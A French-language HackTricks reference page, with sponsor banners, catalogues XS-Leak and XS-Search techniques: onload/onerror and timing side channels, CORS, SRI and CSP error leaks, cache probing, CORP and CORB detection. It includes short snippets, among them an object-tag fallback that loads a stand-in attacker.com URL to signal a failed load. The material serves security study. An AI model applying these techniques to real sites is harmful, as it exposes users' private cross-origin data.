# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez-y aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Informations de base

XS-Search est une m√©thode utilis√©e pour **extraire des informations entre origines** en exploitant des **vuln√©rabilit√©s de canal lat√©ral**.

Les composants cl√©s impliqu√©s dans cette attaque comprennent :

* **Site Web Vuln√©rable** : Le site Web cible √† partir duquel les informations doivent √™tre extraites.
* **Site Web de l'Attaquant** : Le site Web malveillant cr√©√© par l'attaquant, que la victime visite, h√©bergeant l'exploit.
* **M√©thode d'Inclusion** : La technique utilis√©e pour incorporer le Site Web Vuln√©rable dans le Site Web de l'Attaquant (par exemple, window.open, iframe, fetch, balise HTML avec href, etc.).
* **Technique de Fuite** : Techniques utilis√©es pour discerner les diff√©rences dans l'√©tat du Site Web Vuln√©rable en fonction des informations recueillies via la m√©thode d'inclusion.
* **√âtats** : Les deux conditions potentielles du Site Web Vuln√©rable, que l'attaquant cherche √† distinguer.
* **Diff√©rences D√©tectables** : Variations observables sur lesquelles l'attaquant s'appuie pour d√©duire l'√©tat du Site Web Vuln√©rable.

### Diff√©rences D√©tectables

Plusieurs aspects peuvent √™tre analys√©s pour diff√©rencier les √©tats du Site Web Vuln√©rable :

* **Code d'√âtat** : Distinction entre **divers codes d'√©tat de r√©ponse HTTP** entre origines, comme les erreurs serveur, les erreurs client ou les erreurs d'authentification.
* **Utilisation de l'API** : Identification de l'**utilisation des API Web** √† travers les pages, r√©v√©lant si une page entre origines utilise une API Web JavaScript sp√©cifique.
* **Redirections** : D√©tection des navigations vers diff√©rentes pages, non seulement les redirections HTTP mais aussi celles d√©clench√©es par JavaScript ou HTML.
* **Contenu de la Page** : Observation des **variations dans le corps de la r√©ponse HTTP** ou dans les sous-ressources de la page, telles que le **nombre de cadres int√©gr√©s** ou les disparit√©s de taille dans les images.
* **En-T√™te HTTP** : Noter la pr√©sence ou √©ventuellement la valeur d'un **en-t√™te de r√©ponse HTTP sp√©cifique**, y compris des en-t√™tes comme X-Frame-Options, Content-Disposition et Cross-Origin-Resource-Policy.
* **Chronom√©trage** : Noter les disparit√©s de temps constantes entre les deux √©tats.

### M√©thodes d'Inclusion

* **√âl√©ments HTML** : HTML offre divers √©l√©ments pour **l'inclusion de ressources entre origines**, comme les feuilles de style, les images ou les scripts, obligeant le navigateur √† demander une ressource non-HTML. Une compilation des √©l√©ments HTML potentiels √† cette fin peut √™tre trouv√©e √† [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Cadres** : Des √©l√©ments tels que **iframe**, **object** et **embed** peuvent int√©grer directement des ressources HTML dans la page de l'attaquant. Si la page **manque de protection de cadrage**, JavaScript peut acc√©der √† l'objet window de la ressource encadr√©e via la propri√©t√© contentWindow.
* **Pop-ups** : La m√©thode **`window.open`** ouvre une ressource dans un nouvel onglet ou une nouvelle fen√™tre, fournissant une **poign√©e de fen√™tre** pour que JavaScript interagisse avec les m√©thodes et propri√©t√©s suivant le SOP. Les pop-ups, souvent utilis√©s dans la connexion unique, contournent les restrictions de cadrage et de cookies d'une ressource cible. Cependant, les navigateurs modernes restreignent la cr√©ation de pop-ups √† certaines actions de l'utilisateur.
* **Requ√™tes JavaScript** : JavaScript permet des requ√™tes directes vers des ressources cibles en utilisant des **XMLHttpRequests** ou l'**API Fetch**. Ces m√©thodes offrent un contr√¥le pr√©cis sur la requ√™te, comme choisir de suivre les redirections HTTP.

### Techniques de Fuite

* **Gestionnaire d'√âv√©nements** : Une technique de fuite classique dans les XS-Leaks, o√π les gestionnaires d'√©v√©nements comme **onload** et **onerror** fournissent des informations sur le succ√®s ou l'√©chec du chargement de la ressource.
* **Messages d'Erreur** : Les exceptions JavaScript ou les pages d'erreur sp√©ciales peuvent fournir des informations de fuite soit directement √† partir du message d'erreur, soit en diff√©renciant sa pr√©sence et son absence.
* **Limites Globales** : Les limitations physiques d'un navigateur, comme la capacit√© m√©moire ou d'autres limites de navigateur impos√©es, peuvent indiquer quand un seuil est atteint, servant de technique de fuite.
* **√âtat Global** : Les interactions d√©tectables avec les **√©tats globaux des navigateurs** (par exemple, l'interface Historique) peuvent √™tre exploit√©es. Par exemple, le **nombre d'entr√©es** dans l'historique d'un navigateur peut fournir des indices sur les pages entre origines.
* **API de Performance** : Cette API fournit des **d√©tails de performance de la page actuelle**, y compris le chronom√©trage r√©seau pour le document et les ressources charg√©es, permettant des inf√©rences sur les ressources demand√©es.
* **Attributs Lisibles** : Certains attributs HTML sont **lisibles entre origines** et peuvent √™tre utilis√©s comme technique de fuite. Par exemple, la propri√©t√© `window.frame.length` permet √† JavaScript de compter les cadres inclus dans une page Web entre origines.

## Outil XSinator & Document

XSinator est un outil automatique pour **v√©rifier les navigateurs contre plusieurs XS-Leaks connus** expliqu√©s dans son document : **[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)**

Vous pouvez **acc√©der √† l'outil sur [https://xsinator.com/](https://xsinator.com/)**

{% hint style="warning" %}
**XS-Leaks Exclus** : Nous avons d√ª exclure les XS-Leaks qui reposent sur les **travailleurs de service** car ils interf√©reraient avec d'autres fuites dans XSinator. De plus, nous avons choisi d'**exclure les XS-Leaks qui reposent sur des erreurs de configuration et des bugs dans une application Web sp√©cifique**. Par exemple, les mauvaises configurations de partage de ressources entre origines (CORS), les fuites de postMessage ou les scripts intersites. De plus, nous avons exclu les XS-Leaks bas√©s sur le temps car ils souffrent souvent d'√™tre lents, bruyants et impr√©cis.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez-y aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **Techniques Bas√©es sur le Chronom√©trage**

Certaines des techniques suivantes vont utiliser le chronom√©trage comme partie du processus pour d√©tecter les diff√©rences dans les √©tats possibles des pages Web. Il existe diff√©rentes fa√ßons de mesurer le temps dans un navigateur Web.

**Horloges** : L'API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permet aux d√©veloppeurs d'obtenir des mesures de chronom√©trage haute r√©solution.\
Il existe un nombre consid√©rable d'API que les attaquants peuvent exploiter pour cr√©er des horloges implicites : [API de Canal de Diffusion](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [API de Canal de Message](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), animations CSS, et autres.\
Pour plus d'informations : [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Techniques de Gestionnaire d'√âv√©nements

### Onload/Onerror

* **M√©thodes d'Inclusion** : Cadres, √âl√©ments HTML
* **Diff√©rence D√©tectable** : Code d'√âtat
* **Plus d'informations** : [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **R√©sum√©** : si on essaie de charger une ressource, les √©v√©nements onerror/onload sont d√©clench√©s lorsque la ressource est charg√©e avec succ√®s/√©chec, il est possible de d√©terminer le code d'√©tat.
* **Exemple de code** : [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

L'exemple de code tente de **charger des objets de scripts √† partir de JS**, mais **d'autres balises** telles que les objets, les feuilles de style, les images, les audios pourraient √©galement √™tre utilis√©es. De plus, il est √©galement possible d'injecter directement la **balise** et de d√©clarer les √©v√©nements `onload` et `onerror` √† l'int√©rieur de la balise (au lieu de l'injecter depuis JS).

Il existe √©galement une version de cette attaque sans script :
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Dans ce cas, si `example.com/404` n'est pas trouv√©, `attacker.com/?error` sera charg√©.

### Chronom√©trage de l'√©v√©nement Onload

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: Chronom√©trage (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **R√©sum√©:** L'API [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te. Cependant, d'autres horloges pourraient √™tre utilis√©es, telles que l'API [**PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) qui peut identifier les t√¢ches s'ex√©cutant pendant plus de 50 ms.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) un autre exemple dans:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Chronom√©trage de l'√©v√©nement Onload + T√¢che Lourde Forc√©e

Cette technique est similaire √† la pr√©c√©dente, mais l'**attaquant** forcera √©galement une action √† prendre un **temps significatif** lorsque la **r√©ponse est positive ou n√©gative** et mesurera ce temps.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Chronom√©trage de l'√©v√©nement unload/beforeunload

* **M√©thodes d'inclusion**: Cadres
* **Diff√©rence d√©tectable**: Chronom√©trage (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **R√©sum√©:** L'horloge [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Le temps n√©cessaire pour r√©cup√©rer une ressource peut √™tre mesur√© en utilisant les √©v√©nements [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) et [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event). L'√©v√©nement **`beforeunload`** est d√©clench√© lorsque le navigateur s'appr√™te √† naviguer vers une nouvelle page, tandis que l'√©v√©nement **`unload`** se produit lorsque la navigation est effectivement en cours. La diff√©rence de temps entre ces deux √©v√©nements peut √™tre calcul√©e pour d√©terminer la **dur√©e pendant laquelle le navigateur a pass√© √† r√©cup√©rer la ressource**.

### Chronom√©trage du Cadre Sanctionn√© + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **M√©thodes d'inclusion**: Cadres
* **Diff√©rence d√©tectable**: Chronom√©trage (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **R√©sum√©:** L'API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Il a √©t√© observ√© que en l'absence de [Protections de Cadre](https://xsleaks.dev/docs/defenses/opt-in/xfo/), le temps n√©cessaire pour qu'une page et ses sous-ressources se chargent sur le r√©seau peut √™tre mesur√© par un attaquant. Cette mesure est g√©n√©ralement possible car le gestionnaire `onload` d'un iframe est d√©clench√© uniquement apr√®s l'ach√®vement du chargement des ressources et de l'ex√©cution JavaScript. Pour contourner la variabilit√© introduite par l'ex√©cution de script, un attaquant pourrait utiliser l'attribut [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) dans la balise `<iframe>`. L'inclusion de cet attribut restreint de nombreuses fonctionnalit√©s, notamment l'ex√©cution de JavaScript, facilitant ainsi une mesure principalement influenc√©e par les performances du r√©seau.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + erreur + onload

* **M√©thodes d'inclusion**: Cadres
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**:
* **R√©sum√©**: Si vous pouvez provoquer une erreur sur la page lorsque le contenu correct est consult√© et la charger correctement lorsque n'importe quel contenu est consult√©, alors vous pouvez cr√©er une boucle pour extraire toutes les informations sans mesurer le temps.
* **Exemple de code**:

Supposons que vous puissiez **ins√©rer** la **page** qui contient le **contenu secret** **√† l'int√©rieur d'un Iframe**.

Vous pouvez **faire en sorte que la victime recherche** le fichier contenant "_**flag**_" en utilisant un **Iframe** (en exploitant par exemple une CSRF). √Ä l'int√©rieur de l'Iframe, vous savez que l'_**√©v√©nement onload**_ sera **ex√©cut√© au moins une fois**. Ensuite, vous pouvez **changer** l'**URL** de l'**iframe** en changeant uniquement le **contenu** du **hash** dans l'URL.

Par exemple:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Si le premier URL a √©t√© **charg√© avec succ√®s**, alors, lorsque vous **changez** la **partie hash** de l'URL, l'√©v√©nement **onload** ne sera **pas d√©clench√© √† nouveau**. Mais **si** la page a rencontr√© une **erreur** lors du **chargement**, alors, l'√©v√©nement **onload** sera **d√©clench√© √† nouveau**.

Ensuite, vous pouvez **distinguer entre** une page **charg√©e correctement** ou une page qui a une **erreur** lorsqu'elle est consult√©e.

### Ex√©cution de Javascript

* **M√©thodes d'inclusion**: Cadres
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**:
* **R√©sum√©**: Si la **page** **retourne** le **contenu sensible**, ou un **contenu** qui peut √™tre **contr√¥l√©** par l'utilisateur. L'utilisateur pourrait d√©finir du **code JS valide dans le cas n√©gatif**, et **charger** chaque essai √† l'int√©rieur des balises **`<script>`**, ainsi dans les cas **n√©gatifs** le **code** des attaquants est **ex√©cut√©**, et dans les cas **affirmatifs** **rien** ne sera ex√©cut√©.
* **Exemple de code**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: Code d'√©tat & En-t√™tes
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **R√©sum√©**: **Cross-Origin Read Blocking (CORB)** est une mesure de s√©curit√© qui emp√™che les pages web de charger certaines ressources sensibles d'origines crois√©es pour se prot√©ger contre des attaques comme **Spectre**. Cependant, les attaquants peuvent exploiter son comportement protecteur. Lorsqu'une r√©ponse soumise √† **CORB** renvoie un `Content-Type` _**prot√©g√© par CORB**_ avec `nosniff` et un code d'√©tat `2xx`, **CORB** supprime le corps et les en-t√™tes de la r√©ponse. Les attaquants observant cela peuvent d√©duire la combinaison du **code d'√©tat** (indiquant le succ√®s ou l'erreur) et du `Content-Type` (indiquant s'il est prot√©g√© par **CORB**), menant √† une fuite potentielle d'informations.
* **Exemple de code**:

Consultez le lien pour plus d'informations sur l'attaque.

### onblur

* **M√©thodes d'inclusion**: Cadres
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **R√©sum√©**: Fuite de donn√©es sensibles √† partir de l'attribut id ou name.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Il est possible de **charger une page** √† l'int√©rieur d'un **iframe** et d'utiliser l'**`#id_value`** pour que la page se **concentre sur l'√©l√©ment** de l'iframe avec l'identifiant indiqu√©, puis si un signal **`onblur`** est d√©clench√©, l'√©l√©ment ID existe.\
Vous pouvez effectuer la m√™me attaque avec des balises **`portal`**.
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### Erreur CORS

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'informations** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **R√©sum√©** : Dans les assertions de s√©curit√© (SA), les messages d'erreur CORS exposent involontairement l'URL compl√®te des requ√™tes redirig√©es.
* **Exemple de code** : [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Cette technique permet √† un attaquant d'**extraire la destination d'une redirection d'un site cross-origin** en exploitant la mani√®re dont les navigateurs bas√©s sur Webkit g√®rent les requ√™tes CORS. Plus pr√©cis√©ment, lorsqu'une **requ√™te activ√©e CORS** est envoy√©e √† un site cible qui effectue une redirection en fonction de l'√©tat de l'utilisateur et que le navigateur rejette ensuite la requ√™te, l'**URL compl√®te de la cible de la redirection** est divulgu√©e dans le message d'erreur. Cette vuln√©rabilit√© r√©v√®le non seulement la redirection mais expose √©galement le point final de la redirection et tout **param√®tre de requ√™te sensible** qu'elle peut contenir.

### Erreur SRI

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'informations** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **R√©sum√©** : Dans les assertions de s√©curit√© (SA), les messages d'erreur CORS exposent involontairement l'URL compl√®te des requ√™tes redirig√©es.
* **Exemple de code** : [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Un attaquant peut exploiter les **messages d'erreur verbeux** pour d√©duire la taille des r√©ponses cross-origin. Cela est possible en raison du m√©canisme d'int√©grit√© des sous-ressources (SRI), qui utilise l'attribut d'int√©grit√© pour valider que les ressources r√©cup√©r√©es, souvent √† partir de CDN, n'ont pas √©t√© alt√©r√©es. Pour que le SRI fonctionne sur des ressources cross-origin, celles-ci doivent √™tre **activ√©es CORS** ; sinon, elles ne sont pas soumises √† des v√©rifications d'int√©grit√©. Dans les assertions de s√©curit√© (SA), tout comme la fuite XS-Leak d'erreur CORS, un message d'erreur peut √™tre captur√© apr√®s une requ√™te fetch avec un attribut d'int√©grit√© √©choue. Les attaquants peuvent d√©lib√©r√©ment **d√©clencher cette erreur** en attribuant une **valeur de hachage bidon** √† l'attribut d'int√©grit√© de n'importe quelle requ√™te. Dans SA, le message d'erreur r√©sultant r√©v√®le involontairement la longueur du contenu de la ressource demand√©e. Cette fuite d'informations permet √† un attaquant de discerner les variations de taille de r√©ponse, ouvrant la voie √† des attaques XS-Leak sophistiqu√©es.

### Violation/D√©tection CSP

* **M√©thodes d'inclusion** : Pop-ups
* **Diff√©rence d√©tectable** : Code d'√©tat
* **Plus d'informations** : [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **R√©sum√©** : En n'autorisant que le site des victimes dans la CSP, si nous y acc√©dons et tentons de rediriger vers un domaine diff√©rent, la CSP d√©clenchera une erreur d√©tectable.
* **Exemple de code** : [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Un XS-Leak peut utiliser la CSP pour d√©tecter si un site cross-origin a √©t√© redirig√© vers une origine diff√©rente. Cette fuite peut d√©tecter la redirection, mais en plus, le domaine de la cible de la redirection fuit. L'id√©e de base de cette attaque est d'**autoriser le domaine cible sur le site de l'attaquant**. Une fois qu'une requ√™te est envoy√©e au domaine cible, il **redirige** vers un domaine cross-origin. La CSP **bloque** l'acc√®s et cr√©e un **rapport de violation utilis√© comme technique de fuite**. Selon le navigateur, **ce rapport peut divulguer l'emplacement cible de la redirection**.\
Les navigateurs modernes ne signaleront pas l'URL vers laquelle la redirection a √©t√© effectu√©e, mais vous pouvez toujours d√©tecter qu'une redirection cross-origin a √©t√© d√©clench√©e.

### Cache

* **M√©thodes d'inclusion** : Frames, Pop-ups
* **Diff√©rence d√©tectable** : Contenu de la page
* **Plus d'informations** : [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **R√©sum√©** : Effacez le fichier du cache. Ouvrez la page cible, v√©rifiez si le fichier est pr√©sent dans le cache.
* **Exemple de code** : 

Les navigateurs peuvent utiliser un cache partag√© pour tous les sites Web, quel que soit leur origine, il est possible de d√©duire si une page cible a **demand√© un fichier sp√©cifique**.

Si une page charge une image uniquement si l'utilisateur est connect√©, vous pouvez **invalider** la **ressource** (pour qu'elle ne soit plus mise en cache si elle l'√©tait, voir les liens pour plus d'informations), **effectuer une requ√™te** qui pourrait charger cette ressource et essayer de charger la ressource **avec une mauvaise requ√™te** (par exemple, en utilisant un en-t√™te referer trop long). Si le chargement de la ressource n'a **pas d√©clench√© d'erreur**, c'est parce qu'elle √©tait **mise en cache**.

### Directive CSP

* **M√©thodes d'inclusion** : Frames
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'informations** : [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **R√©sum√©** : Les directives d'en-t√™te CSP peuvent √™tre sond√©es en utilisant l'attribut iframe CSP, r√©v√©lant les d√©tails de la politique.
* **Exemple de code** : [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Une nouvelle fonctionnalit√© dans Google Chrome (GC) permet aux pages Web de **proposer une politique de s√©curit√© du contenu (CSP)** en d√©finissant un attribut sur un √©l√©ment iframe, avec des directives de politique transmises avec la requ√™te HTTP. Normalement, le contenu int√©gr√© doit **autoriser cela via un en-t√™te HTTP**, ou une **page d'erreur est affich√©e**. Cependant, si l'iframe est d√©j√† r√©gi par une CSP et que la nouvelle politique propos√©e n'est pas plus restrictive, la page se chargera normalement. Ce m√©canisme ouvre la voie √† un attaquant pour **d√©tecter des directives CSP sp√©cifiques** d'une page cross-origin en identifiant la page d'erreur. Bien que cette vuln√©rabilit√© ait √©t√© marqu√©e comme corrig√©e, nos d√©couvertes r√©v√®lent une **nouvelle technique de fuite** capable de d√©tecter la page d'erreur, sugg√©rant que le probl√®me sous-jacent n'a jamais √©t√© enti√®rement r√©solu.

### **CORP**

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'informations** : [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **R√©sum√©** : Les ressources s√©curis√©es avec la politique de ressources cross-origin (CORP) g√©n√©reront une erreur lorsqu'elles sont r√©cup√©r√©es √† partir d'une origine non autoris√©e.
* **Exemple de code** : [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

L'en-t√™te CORP est une fonctionnalit√© de s√©curit√© relativement nouvelle sur la plateforme Web qui, lorsqu'elle est d√©finie, **bloque les requ√™tes cross-origin no-cors vers la ressource donn√©e**. La pr√©sence de l'en-t√™te peut √™tre d√©tect√©e, car une ressource prot√©g√©e par CORP **g√©n√©rera une erreur lorsqu'elle est r√©cup√©r√©e**.

### CORB

* **M√©thodes d'inclusion** : √âl√©ments HTML
* **Diff√©rence d√©tectable** : En-t√™tes
* **Plus d'informations** : [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **R√©sum√©** : CORB peut permettre aux attaquants de d√©tecter lorsque l'en-t√™te **`nosniff` est pr√©sent** dans la requ√™te.
* **Exemple de code** : [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Consultez le lien pour plus d'informations sur l'attaque.

### Erreur CORS sur la mauvaise configuration de r√©flexion d'origine <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : En-t√™tes
* **Plus d'informations** : [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **R√©sum√©** : Si l'en-t√™te Origine est r√©fl√©chi dans l'en-t√™te `Access-Control-Allow-Origin`, il est possible de v√©rifier si une ressource est d√©j√† en cache.
* **Exemple de code** : [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Dans le cas o√π l'en-t√™te **Origine** est **r√©fl√©chi** dans l'en-t√™te `Access-Control-Allow-Origin`, un attaquant peut exploiter ce comportement pour tenter de **r√©cup√©rer** la **ressource** en mode **CORS**. Si une **erreur n'est pas** d√©clench√©e, cela signifie qu'elle a √©t√© **correctement r√©cup√©r√©e du Web** ; si une erreur est **d√©clench√©e**, c'est parce qu'elle a √©t√© **acc√©d√©e depuis le cache** (l'erreur appara√Æt car le cache enregistre une r√©ponse avec un en-t√™te CORS autorisant le domaine d'origine et non le domaine de l'attaquant).\
